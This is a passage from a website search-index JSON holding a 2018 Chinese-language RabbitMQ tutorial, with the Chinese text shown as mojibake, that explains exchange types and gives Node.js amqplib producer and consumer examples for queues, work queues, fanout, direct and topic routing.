Routing Key ï¼Œç„¶åå°†æ¶ˆæ¯ä¼ é€’ç»™äº¤æ¢å™¨ Exchange ã€‚ äº¤æ¢å™¨ Exchange æ¥æ”¶åˆ°æ¶ˆæ¯åæ ¹æ® Exchange Type ä¹Ÿå°±æ˜¯äº¤æ¢å™¨ç±»å‹ä»¥åŠäº¤æ¢å™¨å’Œé˜Ÿåˆ—çš„ Binding ç»‘å®šå…³ç³»æ¥åˆ¤æ–­è·¯ç”±è§„åˆ™å¹¶åˆ†å‘æ¶ˆæ¯åˆ°å…·ä½“çš„é˜Ÿåˆ— Queue ä¸­ã€‚ æ¶ˆè´¹è€… Consumer é€šè¿‡è®¢é˜…å…·ä½“çš„é˜Ÿåˆ—ï¼Œä¸€æ—¦é˜Ÿåˆ—æ¥æ”¶åˆ°æ¶ˆæ¯ä¾¿ä¼šå°†å…¶ä¼ é€’ç»™æ¶ˆè´¹è€…ã€‚ è¿™é‡Œçš„ Routing Key å’Œ Binding æˆ‘æ˜¯æŒ‰ç…§è‡ªå·±çš„ç†è§£è§£é‡Šçš„ï¼Œä¸æŸäº›å‚è€ƒèµ„æ–™æ˜¯æœ‰å‡ºå…¥çš„ï¼Œè¯»è€…ç†è§£å°±å¥½ã€‚ å½“ç„¶å®Œæˆä¸Šè¿°ä¸‰ä¸ªæ­¥éª¤è¿˜ç¼ºå°‘ä¸¤ä¸ªå…³é”®çš„ä¸œè¥¿ï¼š Connection ï¼šè¿æ¥ï¼Œä¸è®ºç”Ÿäº§è€…è¿˜æ˜¯æ¶ˆè´¹è€…æƒ³è¦ä½¿ç”¨ RabbitMQ éƒ½å¿…é¡»é¦–å…ˆå»ºç«‹åˆ° RabbitMQ çš„ TCP è¿æ¥ã€‚ Channel ï¼šä¿¡é“ï¼Œå»ºç«‹å®Œ TCP è¿æ¥åè¿˜å¿…é¡»å»ºç«‹ä¸€ä¸ªä¿¡é“ï¼Œæ¶ˆæ¯éƒ½æ˜¯åœ¨ä¿¡é“ä¸­ä¼ é€’å’Œæ“ä½œçš„ã€‚ ä¸Šå›¾å½¢è±¡çš„å±•ç¤ºäº†è¿æ¥å’Œä¿¡é“ä¹‹é—´çš„å…³ç³»ï¼Œä¸€ä¸ªè¿æ¥ä¸­å¯ä»¥å»ºç«‹å¤šä¸ªä¿¡é“ï¼Œè€Œä¸”æ¯ä¸ªä¿¡é“ä¹‹é—´éƒ½æ˜¯å®Œå…¨éš”ç¦»çš„ï¼ŒåŒæ—¶æˆ‘ä»¬éœ€è¦è®°ä½çš„æ˜¯åˆ›å»ºå’Œé”€æ¯ TCP è¿æ¥æ˜¯å¾ˆæ¶ˆè€—èµ„æºçš„ï¼Œè€Œä¿¡é“åˆ™ä¸æ˜¯ï¼Œæ‰€ä»¥èƒ½å¤Ÿé€šè¿‡åˆ›å»ºå¤šä¸ªä¿¡é“æ¥éš”ç¦»ç¯å¢ƒçš„ä¸è¦é€šè¿‡åˆ›å»ºå¤šä¸ªè¿æ¥ã€‚ ","date":"2018-02-27","objectID":"/rabbitmq/:1:1","tags":["MQ","Node.js","RabbitMQ"],"title":"RabbitMQ å…¥é—¨æ•™ç¨‹åŠç¤ºä¾‹","uri":"/rabbitmq/"},{"categories":["Middleware"],"content":"äº¤æ¢å™¨ç±»å‹ äº¤æ¢å™¨å…·æœ‰è·¯ç”±åˆ†å‘æ¶ˆæ¯çš„ä½œç”¨ï¼Œå…¶æœ‰å››ç§ä¸åŒçš„ç±»å‹ï¼Œæ¯ç§ç±»å‹å¯¹åº”ä¸åŒçš„è·¯ç”±è§„åˆ™ï¼š fanout ï¼šå¹¿æ’­ï¼Œå°†æ¶ˆæ¯ä¼ é€’ç»™æ‰€æœ‰è¯¥äº¤æ¢å™¨ç»‘å®šçš„é˜Ÿåˆ—ã€‚ direct ï¼šç›´è¿ï¼Œå°†æ¶ˆæ¯ä¼ é€’ç»™ Routing Key ä¸ Binding Keyå®Œå…¨ä¸€è‡´çš„é˜Ÿåˆ—ä¸­ï¼Œå¯ä»¥æœ‰å¤šä¸ªé˜Ÿåˆ—ã€‚ topic ï¼šæ¨¡ç³ŠåŒ¹é…ï¼ŒBinding Key æ˜¯ä¸€ä¸ªå¯ä»¥ç”¨ç¬¦å· . åˆ†éš”å•è¯çš„å­—ç¬¦ä¸²ï¼Œæ¨¡ç³ŠåŒ¹é…ä¸‹ï¼Œç¬¦å· * ç”¨äºåŒ¹é…ä»»æ„ä¸€ä¸ªå•è¯ï¼Œç¬¦å· # ç”¨äºåŒ¹é…é›¶ä¸ªæˆ–å¤šä¸ªå•è¯ã€‚ headers ï¼šè¿™ä¸ªæ¯”è¾ƒç‰¹æ®Šï¼Œæ˜¯æ ¹æ®æ¶ˆæ¯ä¸­å…·ä½“å†…å®¹çš„ header å±æ€§æ¥ä½œä¸ºè·¯ç”±è§„åˆ™çš„ï¼Œè¿™ç§ç±»å‹å¯¹èµ„æºæ¶ˆè€—å¤ªå¤§ï¼Œä¸€èˆ¬å¾ˆå°‘ä½¿ç”¨ï¼Œå‰é¢ä¸‰ç§ç±»å‹å°±å¤Ÿäº†ã€‚ ","date":"2018-02-27","objectID":"/rabbitmq/:1:2","tags":["MQ","Node.js","RabbitMQ"],"title":"RabbitMQ å…¥é—¨æ•™ç¨‹åŠç¤ºä¾‹","uri":"/rabbitmq/"},{"categories":["Middleware"],"content":"äºŒ ","date":"2018-02-27","objectID":"/rabbitmq/:2:0","tags":["MQ","Node.js","RabbitMQ"],"title":"RabbitMQ å…¥é—¨æ•™ç¨‹åŠç¤ºä¾‹","uri":"/rabbitmq/"},{"categories":["Middleware"],"content":"æµç¨‹ æˆ‘ä»¬å…ˆæ¥äº†è§£ä¸€ä¸‹ RabbitMQ çš„ä¸€èˆ¬ä½¿ç”¨æµç¨‹ã€‚ å»ºç«‹åˆ° RabbitMQ çš„è¿æ¥ã€‚ åˆ›å»ºä¿¡é“ã€‚ å£°æ˜äº¤æ¢å™¨ã€‚ å£°æ˜é˜Ÿåˆ—ã€‚ ç»‘å®šäº¤æ¢å™¨å’Œé˜Ÿåˆ—ã€‚ æ¶ˆæ¯æ“ä½œã€‚ç”Ÿäº§è€…ï¼šç”Ÿæˆå¹¶å‘å¸ƒæ¶ˆæ¯ï¼›æ¶ˆè´¹è€…ï¼šè®¢é˜…å¹¶æ¶ˆè´¹æ¶ˆæ¯ã€‚ å…³é—­ä¿¡é“ã€‚ å…³é—­è¿æ¥ã€‚ ä¸è®ºæ˜¯ç”Ÿäº§è€…æŠ•é€’æ¶ˆæ¯ï¼Œè¿˜æ˜¯æ¶ˆè´¹è€…æ¥å—æ¶ˆæ¯ä¸€èˆ¬éƒ½éµå¾ªä»¥ä¸Šæ­¥éª¤ï¼Œä½†é’ˆå¯¹å…·ä½“çš„æƒ…å†µä»ä¼šæœ‰è°ƒæ•´ï¼Œæ¯”å¦‚å£°æ˜äº¤æ¢å™¨ã€å£°æ˜é˜Ÿåˆ—ã€ç»‘å®šäº¤æ¢å™¨å’Œé˜Ÿåˆ—ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨ç”Ÿäº§è€…æˆ–æ¶ˆè´¹è€…å…¶ä¸­ä¹‹ä¸€è¿›è¡Œï¼Œç”šè‡³éš”ç¦»å‡ºæ¥ç‹¬ç«‹ç»´æŠ¤ï¼Œåªè¦ä¿è¯åœ¨å‘å¸ƒæˆ–æ¶ˆè´¹æ¶ˆæ¯ä¹‹å‰äº¤æ¢å™¨ã€é˜Ÿåˆ—ã€ç»‘å®šç­‰æ˜¯æœ‰æ•ˆçš„å³å¯ã€‚ ","date":"2018-02-27","objectID":"/rabbitmq/:2:1","tags":["MQ","Node.js","RabbitMQ"],"title":"RabbitMQ å…¥é—¨æ•™ç¨‹åŠç¤ºä¾‹","uri":"/rabbitmq/"},{"categories":["Middleware"],"content":"Hello World ç¤ºä¾‹ ç¬¬ä¸€ä¸ªç¤ºä¾‹ï¼Œå®ç°åŸºæœ¬çš„æŠ•é€’å’Œæ¥æ”¶æ¶ˆæ¯ã€‚ ç”Ÿäº§è€…æŠ•é€’æ¶ˆæ¯ï¼ˆsend.jsï¼‰ï¼š const amqp = require('amqplib'); (async () =\u003e { try { const conn = await amqp.connect('amqp://localhost'); //å»ºç«‹è¿æ¥ const ch = await conn.createChannel(); //å»ºç«‹ä¿¡é“ const queueName = 'hello'; const msg = 'Hello world'; await ch.assertQueue(queueName, { durable: false }); //å£°æ˜é˜Ÿåˆ—ï¼Œdurableï¼šfalse ä¸å¯¹é˜Ÿåˆ—æŒä¹…åŒ– ch.sendToQueue(queueName, new Buffer(msg)); //å‘é€æ¶ˆæ¯ console.log(' [x] Sent %s', msg); await ch.close(); //å…³é—­ä¿¡é“ await conn.close(); //å…³é—­è¿æ¥ } catch (error) { console.log(error); } })() æ¶ˆè´¹è€…æ¥æ”¶æ¶ˆæ¯ï¼ˆreceive.jsï¼‰ï¼š const amqp = require('amqplib'); (async () =\u003e { try { const conn = await amqp.connect('amqp://localhost'); //å»ºç«‹è¿æ¥ const ch = await conn.createChannel(); //å»ºç«‹ä¿¡é“ const queueName = 'hello'; await ch.assertQueue(queueName, { durable: false }); //å£°æ˜é˜Ÿåˆ—ï¼Œdurableï¼šfalse ä¸å¯¹é˜Ÿåˆ—æŒä¹…åŒ– console.log(\" [*] Waiting for messages in queue: %s. To exit press CTRL+C\", queueName); ch.consume(queueName, msg =\u003e { //è®¢é˜…é˜Ÿåˆ—æ¥å—æ¶ˆæ¯ console.log(\" [x] Received %s\", msg.content.toString()); }, { noAck: true }); // noAckï¼štrue ä¸è¿›è¡Œç¡®è®¤æ¥å—åº”ç­” } catch (error) { console.log(error); } })() å¯¹æ¯”ä¸Šè¿°æµç¨‹ï¼Œä½ ä¼šå‘ç°ä¸ºä»€ä¹ˆæ²¡æœ‰äº¤æ¢å™¨ Exchange å­˜åœ¨çš„èº«å½±å‘¢ï¼Ÿè¿™æ˜¯å› ä¸º RabbitMQ å­˜åœ¨ä¸€ä¸ªé»˜è®¤äº¤æ¢å™¨ï¼Œç±»å‹ä¸º direct ï¼ˆç›´è¿ï¼‰ï¼Œæ¯ä¸ªæ–°å»ºçš„é˜Ÿåˆ—ä¼šè‡ªåŠ¨ç»‘å®šåˆ°é»˜è®¤äº¤æ¢å™¨ä¸Šï¼Œå¹¶ä¸”ä»¥é˜Ÿåˆ—çš„åç§°ä½œä¸ºç»‘å®šè·¯ç”±è§„åˆ™ã€‚ å£°æ˜é˜Ÿåˆ—æ—¶ï¼ŒåŒä¸€ä¸ªé˜Ÿåˆ—å…¶å±æ€§å‰åç›¸åŒæ—¶ï¼Œé‡å¤å£°æ˜ä¸ä¼šæœ‰ä»»ä½•å½±å“ï¼Œåä¹‹å…¶å±æ€§å‰åä¸ç›¸åŒæ—¶ï¼Œé‡å¤å£°æ˜ä¼šæŠ›å‡ºä¸€ä¸ªé”™è¯¯ï¼Œè¿™ç§æƒ…å†µè¦æ³¨æ„ä¸å¾—é‡å¤å£°æ˜ï¼Œå½“ç„¶å¦‚æœè¿™ä¸ªé˜Ÿåˆ—è¢«å£°æ˜æœ‰æ•ˆäº†ä¹Ÿä¸éœ€è¦å†æ¬¡å£°æ˜ã€‚ ä»ä¸Šä¾‹ä¸­æˆ‘ä»¬ä¹Ÿäº†è§£åˆ°äº†é˜Ÿåˆ—çš„ä¸€ä¸ªå±æ€§ durableï¼Œè¿™ä¸ªå±æ€§è¡¨æ˜æ˜¯å¦å¯¹é˜Ÿåˆ—è¿›è¡ŒæŒä¹…åŒ–ï¼Œä¹Ÿå°±æ˜¯ä¿å­˜åˆ°ç£ç›˜ä¸Šï¼Œä¸€æ—¦ RabbitMQ æœåŠ¡å™¨é‡å¯ï¼ŒæŒä¹…åŒ–çš„é˜Ÿåˆ—å¯ä»¥è¢«é‡æ–°æ¢å¤ã€‚ æ¶ˆè´¹è€… consume è®¢é˜…æ¥æ”¶æ¶ˆæ¯æ—¶ä½¿ç”¨äº†å¦ä¸€ä¸ªå±æ€§ noAckï¼Œè¿™ä¸ªå±æ€§è¡¨æ˜æ¶ˆè´¹è€…åœ¨æ¥æ”¶åˆ°æ¶ˆæ¯åæ˜¯å¦éœ€è¦å‘ RabbitMQ æœåŠ¡å™¨ç¡®è®¤æ”¶åˆ°è¯¥æ¶ˆæ¯ã€‚ä¸ä¹‹ç›¸å¯¹çš„æ˜¯å‘åå³å¿˜æ¨¡å¼ï¼Œä¹Ÿå°±æ˜¯ RabbitMQ æœåŠ¡å™¨å‘æ¶ˆè´¹è€…å‘é€å®Œæ¶ˆæ¯åå³è®¤ä¸ºæˆåŠŸï¼Œæ— éœ€ç­‰å¾…æ¶ˆè´¹è€…ç¡®è®¤æ¥æ”¶åº”ç­”ï¼Œè¿™ç§æ¨¡å¼ååé‡æ›´é«˜ï¼Œä½†å¯é æ€§æ˜¾ç„¶ä¸å¦‚ç¡®è®¤åº”ç­”æ¨¡å¼ï¼Œè€Œç¡®è®¤åº”ç­”æ¨¡å¼ï¼Œæˆ‘ä»¬éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ RabbitMQ æœåŠ¡å™¨è‹¥æ²¡æœ‰æ¥æ”¶åˆ° ack ç¡®è®¤ä¼šä¸€ç›´å°†è¯¥æ¶ˆæ¯ä¿å­˜ï¼Œå¦‚æœæ¶ˆè´¹è€…æŒ‚äº†å°±ä¼šé€ æˆæ¶ˆæ¯æŒç»­å †å ä¸æ–­å ç”¨å†…å­˜çš„æƒ…å†µï¼Œæç«¯æƒ…å†µä¸‹èµ„æºè¿‡è½½ä¼šé€ æˆ RabbitMQ æœåŠ¡å™¨é‡å¯ï¼ŒåŒæ—¶æœªè¢« ack ç¡®è®¤çš„æ¶ˆæ¯ä¼šè¢«å°è¯•é‡æ–°å‘é€ç»™æ¶ˆè´¹è€…ã€‚ ","date":"2018-02-27","objectID":"/rabbitmq/:2:2","tags":["MQ","Node.js","RabbitMQ"],"title":"RabbitMQ å…¥é—¨æ•™ç¨‹åŠç¤ºä¾‹","uri":"/rabbitmq/"},{"categories":["Middleware"],"content":"Work queues ç¬¬äºŒä¸ªç¤ºä¾‹ï¼Œå‘å¤šä¸ªæ¶ˆè´¹è€…åˆ†å‘æŠ•é€’æ¶ˆæ¯ã€‚ ç”Ÿäº§è€…æŠ•é€’æ¶ˆæ¯ï¼ˆnew_task.jsï¼‰ï¼š const amqp = require('amqplib'); (async () =\u003e { try { const conn = await amqp.connect('amqp://localhost'); //å»ºç«‹è¿æ¥ const ch = await conn.createChannel(); //å»ºç«‹ä¿¡é“ const queueName = 'task_queue'; await ch.assertQueue(queueName, { durable: true }); //å£°æ˜é˜Ÿåˆ—ï¼Œdurableï¼štrue æŒä¹…åŒ–é˜Ÿåˆ— for (let i = 1; i \u003c 10; i++) { //ç”Ÿæˆ 9 æ¡ä¿¡æ¯å¹¶åœ¨å°¾éƒ¨æ·»åŠ å°æ•°ç‚¹ let msg = i.toString().padEnd(i+1, '.'); ch.sendToQueue(queueName, new Buffer(msg), { persistent: true }); //å‘é€æ¶ˆæ¯ï¼Œpersistentï¼štrue å°†æ¶ˆæ¯æŒä¹…åŒ– console.log(\" [x] Sent '%s'\", msg); } await ch.close(); //å…³é—­ä¿¡é“ await conn.close(); //å…³é—­è¿æ¥ } catch (error) { console.log(error); } })() æ¶ˆè´¹è€…æ¥æ”¶æ¶ˆæ¯ï¼ˆworker.jsï¼‰ï¼š const amqp = require('amqplib'); (async () =\u003e { try { const conn = await amqp.connect('amqp://localhost'); //å»ºç«‹è¿æ¥ const ch = await conn.createChannel(); //å»ºç«‹ä¿¡é“ const queueName = 'task_queue'; await ch.assertQueue(queueName, { durable: true }); //å£°æ˜é˜Ÿåˆ— ch.prefetch(1); //æ¯æ¬¡æ¥æ”¶ä¸è¶…è¿‡æŒ‡å®šæ•°é‡çš„æ¶ˆæ¯ console.log(\" [*] Waiting for messages in %s. To exit press CTRL+C\", queueName); ch.consume(queueName, msg =\u003e { const secs = msg.content.toString().split('.').length - 1; console.log(\" [x] Received %s\", msg.content.toString()); setTimeout(() =\u003e { //æ ¹æ®å°æ•°ç‚¹çš„ä¸ªæ•°è®¾ç½®å»¶æ—¶æ—¶é•¿ console.log(\" [x] Done\"); ch.ack(msg); //ç¡®è®¤æ¥æ”¶æ¶ˆæ¯ }, secs * 1000); }, { noAck: false }); //å¯¹æ¶ˆæ¯éœ€è¦æ¥æ”¶ç¡®è®¤ } catch (error) { console.log(error); } })() æˆ‘ä»¬åœ¨ shell ä¸­è¿è¡Œå¤šä¸ª worker.js ä¼šå‘ç°æ¶ˆæ¯è¢«ä¸€ä¸ªä¸€ä¸ªåˆ†å‘åˆ°äº†ä¸åŒçš„ worker æ¶ˆè´¹è€…ï¼Œä¸”åŒä¸€æ¡æ¶ˆæ¯ä¸ä¼šè¢«é‡å¤å‘é€ç»™å¤šä¸ª worker ã€‚ åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬å¯¹é˜Ÿåˆ—è¿›è¡Œäº†æŒä¹…åŒ–ï¼Œå¹¶ä¸”åœ¨æ¶ˆè´¹ç«¯ä½¿ç”¨äº† ack ç¡®è®¤æ¥æ”¶æ¶ˆæ¯ã€‚å‘é€æ¶ˆæ¯æ—¶ï¼Œæˆ‘ä»¬ä½¿ç”¨äº† persistent å±æ€§ï¼Œè¿™ä¸ªå±æ€§è¡¨æ˜æ˜¯å¦å°†æ¶ˆæ¯æŒä¹…åŒ–ã€‚å¦å¤–ï¼Œå¯¹æ¶ˆè´¹è€…è€Œè¨€ï¼Œè¿˜ä½¿ç”¨äº† ch.prefetch() æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•è¡¨æ˜è¯¥æ¶ˆè´¹è€…æ¯æ¬¡æœ€å¤šæ¥æ”¶çš„æ¶ˆæ¯æ•°é‡ï¼Œè¿™æ ·åšæ˜¯å› ä¸ºæŸäº›æƒ…å†µä¸‹æ¶ˆè´¹æ¶ˆæ¯æ˜¯ä¸€ä¸ªå¾ˆè€—æ—¶çš„ä¸šåŠ¡æ“ä½œï¼ŒæŸäº› worker å¯èƒ½å¤„äºç¹å¿™çŠ¶æ€ï¼Œè€Œå¦å¤–ä¸€äº› worker åˆ™å¾ˆç©ºé—²ï¼Œé€šè¿‡ prefetch å’Œ ack å…¶å®æ˜¯å®ç°äº†ç±»ä¼¼äºè´Ÿè½½å‡è¡¡çš„åŠŸèƒ½ï¼Œä¹Ÿå°±æ˜¯å°†æ¶ˆæ¯åˆ†å‘ç»™ç©ºé—²çš„ worker æ¶ˆè´¹ã€‚ ","date":"2018-02-27","objectID":"/rabbitmq/:2:3","tags":["MQ","Node.js","RabbitMQ"],"title":"RabbitMQ å…¥é—¨æ•™ç¨‹åŠç¤ºä¾‹","uri":"/rabbitmq/"},{"categories":["Middleware"],"content":"ä¸‰ æˆ‘ä»¬å†æ¥å›é¡¾ä¸€é RabbitMQ çš„ä¸€èˆ¬ä½¿ç”¨æµç¨‹ï¼š å»ºç«‹åˆ° RabbitMQ çš„è¿æ¥ã€‚ åˆ›å»ºä¿¡é“ã€‚ å£°æ˜äº¤æ¢å™¨ã€‚ å£°æ˜é˜Ÿåˆ—ã€‚ ç»‘å®šäº¤æ¢å™¨å’Œé˜Ÿåˆ—ã€‚ æ¶ˆæ¯æ“ä½œã€‚ç”Ÿäº§è€…ï¼šç”Ÿæˆå¹¶å‘å¸ƒæ¶ˆæ¯ï¼›æ¶ˆè´¹è€…ï¼šè®¢é˜…å¹¶æ¶ˆè´¹æ¶ˆæ¯ã€‚ å…³é—­ä¿¡é“ã€‚ å…³é—­è¿æ¥ã€‚ äº¤æ¢å™¨ Exchange çš„å››ç§ç±»å‹ï¼š fanoutï¼šå¹¿æ’­ï¼Œå°†æ¶ˆæ¯ä¼ é€’ç»™æ‰€æœ‰è¯¥äº¤æ¢å™¨ç»‘å®šçš„é˜Ÿåˆ—ã€‚ direct ï¼šç›´è¿ï¼Œå°†æ¶ˆæ¯ä¼ é€’ç»™ Routing Key ä¸ Binding Keyå®Œå…¨ä¸€è‡´çš„é˜Ÿåˆ—ä¸­ï¼Œå¯ä»¥æœ‰å¤šä¸ªé˜Ÿåˆ—ã€‚ topic ï¼šæ¨¡ç³ŠåŒ¹é…ï¼ŒBinding Key æ˜¯ä¸€ä¸ªå¯ä»¥ç”¨ç¬¦å· . åˆ†éš”å•è¯çš„å­—ç¬¦ä¸²ï¼Œæ¨¡ç³ŠåŒ¹é…ä¸‹ï¼Œç¬¦å· * ç”¨äºåŒ¹é…ä»»æ„ä¸€ä¸ªå•è¯ï¼Œç¬¦å· # ç”¨äºåŒ¹é…é›¶ä¸ªæˆ–å¤šä¸ªå•è¯ã€‚ headers ï¼šæ ¹æ®æ¶ˆæ¯ä¸­å…·ä½“å†…å®¹çš„ header å±æ€§æ¥ä½œä¸ºè·¯ç”±è§„åˆ™çš„ï¼Œè¿™ç§ç±»å‹å¯¹èµ„æºæ¶ˆè€—å¤ªå¤§ä¸”å¾ˆå°‘ä½¿ç”¨ï¼Œæœ¬èŠ‚ä¸å¯¹æ­¤ç±»å‹è¿›è¡Œè®²è¿°ã€‚ ","date":"2018-02-27","objectID":"/rabbitmq/:3:0","tags":["MQ","Node.js","RabbitMQ"],"title":"RabbitMQ å…¥é—¨æ•™ç¨‹åŠç¤ºä¾‹","uri":"/rabbitmq/"},{"categories":["Middleware"],"content":"Publish/Subscribe æ­¤ç¤ºä¾‹é‡ç‚¹å…³æ³¨äº¤æ¢å™¨ Exchange çš„ fanout ç±»å‹ã€‚ æ¶ˆè´¹è€…æ¥æ”¶æ¶ˆæ¯ï¼ˆreceive_log.jsï¼‰ï¼š const amqp = require('amqplib'); (async () =\u003e { try { const conn = await amqp.connect('amqp://localhost'); //å»ºç«‹è¿æ¥ const ch = await conn.createChannel(); //å»ºç«‹ä¿¡é“ const ex = 'logs'; await ch.assertExchange(ex, 'fanout', { durable: false }); //å£°æ˜äº¤æ¢å™¨ const q = await ch.assertQueue('', { exclusive: true }); //å£°æ˜é˜Ÿåˆ—ï¼Œä¸´æ—¶é˜Ÿåˆ—å³ç”¨å³åˆ  console.log(\" [*] Waiting for messages in %s. To exit press CTRL+C\", q.queue); await ch.bindQueue(q.queue, ex, ''); //ç»‘å®šäº¤æ¢å™¨å’Œé˜Ÿåˆ—ï¼Œå‚æ•°ï¼šé˜Ÿåˆ—åã€äº¤æ¢å™¨åã€ç»‘å®šé”®å€¼ ch.consume(q.queue, msg =\u003e { //è®¢é˜…é˜Ÿåˆ—æ¥æ”¶æ¶ˆæ¯ console.log(\" [x] %s\", msg.content.toString()); }, { noAck: true }); } catch (error) { console.log(error); } })() ç”Ÿäº§è€…æŠ•é€’æ¶ˆæ¯ï¼ˆemit_log.jsï¼‰ï¼š const amqp = require('amqplib'); (async () =\u003e { try { const conn = await amqp.connect('amqp://localhost'); //å»ºç«‹è¿æ¥ const ch = await conn.createChannel(); //å»ºç«‹ä¿¡é“ const ex = 'logs'; const msg = process.argv.slice(2).join(' ') || 'Hello World!'; await ch.assertExchange(ex, 'fanout', { durable: false }); //å£°æ˜ exchange ï¼Œç±»å‹ä¸º fanout ï¼Œä¸æŒä¹…åŒ– ch.publish(ex, '', new Buffer(msg)); //å‘é€æ¶ˆæ¯ï¼Œfanout ç±»å‹æ— éœ€æŒ‡å®š routing key console.log(\" [x] Sent %s\", msg); await ch.close(); //å…³é—­ä¿¡é“ await conn.close(); //å…³é—­è¿æ¥ } catch (error) { console.log(error); } })(); fanout ç±»å‹çš„äº¤æ¢å™¨ä¼šç›´æ¥å°†æ¶ˆæ¯å¹¿æ’­åˆ°æ‰€æœ‰ä¸å…¶ç»‘å®šçš„é˜Ÿåˆ—ï¼Œæ‰€ä»¥ç»‘å®šäº¤æ¢å™¨ä¸é˜Ÿåˆ—æ—¶æ— éœ€æŒ‡å®š binding key ï¼ˆç©ºå­—ç¬¦ä¸²ï¼‰ï¼ŒæŠ•é€’æ¶ˆæ¯æ—¶ä¹Ÿæ— éœ€æŒ‡å®š routing key ï¼ˆç©ºå­—ç¬¦ä¸²ï¼‰ã€‚ äº¤æ¢å™¨ä¸é˜Ÿåˆ—ä¸€æ ·å…·æœ‰ durable å±æ€§ï¼Œæ­¤å±æ€§è¡¨ç¤ºæ˜¯å¦å¯¹äº¤æ¢å™¨è¿›è¡ŒæŒä¹…åŒ–ï¼Œä¹Ÿå°±æ˜¯ä¿å­˜åˆ°ç£ç›˜ä¸Šï¼Œä¸€æ—¦ RabbitMQ æœåŠ¡å™¨é‡å¯ï¼ŒæŒä¹…åŒ–çš„äº¤æ¢å™¨å¯ä»¥è¢«é‡æ–°æ¢å¤ã€‚ è¿™é‡Œåœ¨å£°æ˜é˜Ÿåˆ—æ—¶ï¼Œæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯ä¸€ç§ä¸´æ—¶çš„é˜Ÿåˆ—ï¼Œæˆ‘ä»¬æ— éœ€æŒ‡å®šè¯¥é˜Ÿåˆ—çš„åç§°ï¼ŒRabbitMQ ä¼šè‡ªåŠ¨ä¸ºå…¶ç”Ÿæˆä¸€ä¸ªéšæœºçš„åç§°ï¼ŒåŒæ—¶ exclusive å±æ€§è¡¨æ˜è¯¥é˜Ÿåˆ—æ˜¯å¦åªä¼šè¢«å½“å‰è¿æ¥ä½¿ç”¨ï¼Œä¹Ÿå°±æ˜¯è¯´è¿æ¥ä¸€æ—¦å…³é—­åˆ™æ­¤é˜Ÿåˆ—ä¹Ÿä¼šè¢«åˆ é™¤ã€‚ ","date":"2018-02-27","objectID":"/rabbitmq/:3:1","tags":["MQ","Node.js","RabbitMQ"],"title":"RabbitMQ å…¥é—¨æ•™ç¨‹åŠç¤ºä¾‹","uri":"/rabbitmq/"},{"categories":["Middleware"],"content":"Routing æ­¤ç¤ºä¾‹é‡ç‚¹å…³æ³¨äº¤æ¢å™¨ Exchange çš„ direct ç±»å‹ã€‚ æ¶ˆè´¹è€…æ¥æ”¶æ¶ˆæ¯ï¼ˆreceive_log_direct.jsï¼‰ï¼š const amqp = require('amqplib'); (async () =\u003e { try { const args = process.argv.slice(2); if (args.length == 0) { console.log(\"Usage: receive_logs_direct.js [info] [warning] [error]\"); process.exit(1); } const conn = await amqp.connect('amqp://localhost'); //å»ºç«‹è¿æ¥ const ch = await conn.createChannel(); //å»ºç«‹ä¿¡é“ const ex = 'direct_logs'; await ch.assertExchange(ex, 'direct', { durable: false }); //å£°æ˜äº¤æ¢å™¨ const q = await ch.assertQueue('', { exclusive: true }); //å£°æ˜é˜Ÿåˆ— console.log(' [*] Waiting for logs. To exit press CTRL+C'); args.forEach(async severity =\u003e { await ch.bindQueue(q.queue, ex, severity); //ç»‘å®šäº¤æ¢å™¨å’Œé˜Ÿåˆ— }); ch.consume(q.queue, msg =\u003e { //è®¢é˜…é˜Ÿåˆ—æ¥æ”¶æ¶ˆæ¯ console.log(\" [x] %s: '%s'\", msg.fields.routingKey, msg.content.toString()); }, { noAck: true }); } catch (error) { console.log(error); } })() ç”Ÿäº§è€…æŠ•é€’æ¶ˆæ¯ï¼ˆemit_log_direct.jsï¼‰ï¼š const amqp = require('amqplib'); (async () =\u003e { try { const conn = await amqp.connect('amqp://localhost'); //å»ºç«‹è¿æ¥ const ch = await conn.createChannel(); //å»ºç«‹ä¿¡é“ const ex = 'direct_logs'; const args = process.argv.slice(2); const msg = args.slice(1).join(' ') || 'Hello World!'; const severity = (args.length \u003e 0) ? args[0] : 'info'; await ch.assertExchange(ex, 'direct', { durable: false }); //å£°æ˜ exchange ï¼Œç±»å‹ä¸º direct ch.publish(ex, severity, new Buffer(msg)); //å‘é€æ¶ˆæ¯ï¼Œå‚æ•°ï¼šäº¤æ¢å™¨ã€è·¯ç”±é”®ã€æ¶ˆæ¯å†…å®¹ console.log(\" [x] Sent %s: '%s'\", severity, msg); await ch.close(); //å…³é—­ä¿¡é“ await conn.close(); //å…³é—­è¿æ¥ } catch (error) { console.log(error); } })(); äº¤æ¢å™¨ä¸º direct ç±»å‹ï¼Œè·¯ç”±è§„åˆ™æ˜¯ routing key ä¸ binding key å®Œå…¨ä¸€è‡´ï¼Œè¿™å°±æ˜¯è¯´ä¸ä¸Šä¾‹ fanout ç±»å‹ä¸åŒçš„æ˜¯ï¼Œæˆ‘ä»¬å¿…é¡»æŒ‡å®šç»‘å®šäº¤æ¢å™¨å’Œé˜Ÿåˆ—çš„ binding key ï¼ŒæŠ•é€’æ¶ˆæ¯æ—¶ä¹Ÿéœ€è¦æŒ‡å®šè·¯ç”±çš„ routing key ã€‚å…¶ä½™åœ°æ–¹åŸºæœ¬ä¸€è‡´ã€‚ ","date":"2018-02-27","objectID":"/rabbitmq/:3:2","tags":["MQ","Node.js","RabbitMQ"],"title":"RabbitMQ å…¥é—¨æ•™ç¨‹åŠç¤ºä¾‹","uri":"/rabbitmq/"},{"categories":["Middleware"],"content":"Topics æ­¤ç¤ºä¾‹é‡ç‚¹å…³æ³¨äº¤æ¢å™¨ Exchange çš„ topic ç±»å‹ã€‚ æ¶ˆè´¹è€…æ¥æ”¶æ¶ˆæ¯ï¼ˆreceive_log_topic.jsï¼‰ï¼š const amqp = require('amqplib'); (async () =\u003e { try { const args = process.argv.slice(2); if (args.length == 0) { console.log(\"Usage: receive_logs_topic.js \u003cfacility\u003e.\u003cseverity\u003e\"); process.exit(1); } const conn = await amqp.connect('amqp://localhost'); //å»ºç«‹è¿æ¥ const ch = await conn.createChannel(); //å»ºç«‹ä¿¡é“ const ex = 'topic_logs'; await ch.assertExchange(ex, 'topic', { durable: false }); //å£°æ˜äº¤æ¢å™¨ const q = await ch.assertQueue('', { exclusive: true }); //å£°æ˜é˜Ÿåˆ— 